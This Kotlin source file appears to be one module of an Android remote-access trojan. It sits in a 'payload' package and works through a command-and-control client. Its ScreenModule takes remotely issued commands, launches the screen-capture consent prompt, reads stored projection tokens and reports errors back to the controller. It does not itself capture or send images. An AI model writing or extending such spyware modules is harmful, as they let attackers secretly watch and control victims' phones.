package com.ihk909.payload.modules

import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import com.ihk909.payload.C2Client
import org.json.JSONObject

object ScreenModule {
    fun snap(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        runCatching {
            val mpm = ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val code = ctx.getSharedPreferences("ihk909", Context.MODE_PRIVATE)
                .getInt("proj_code", 0)
            val dataStr = ctx.getSharedPreferences("ihk909", Context.MODE_PRIVATE)
                .getString("proj_data", null)

            if (code == 0 || dataStr == null) {
                val i = mpm.createScreenCaptureIntent()
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                ctx.startActivity(i)
                c2.replyError(id, "consent required")
                return
            }
            c2.replyError(id, "consent token cannot be reconstructed — restart app")
        }.onFailure { c2.replyError(id, it.message ?: "error") }
    }
}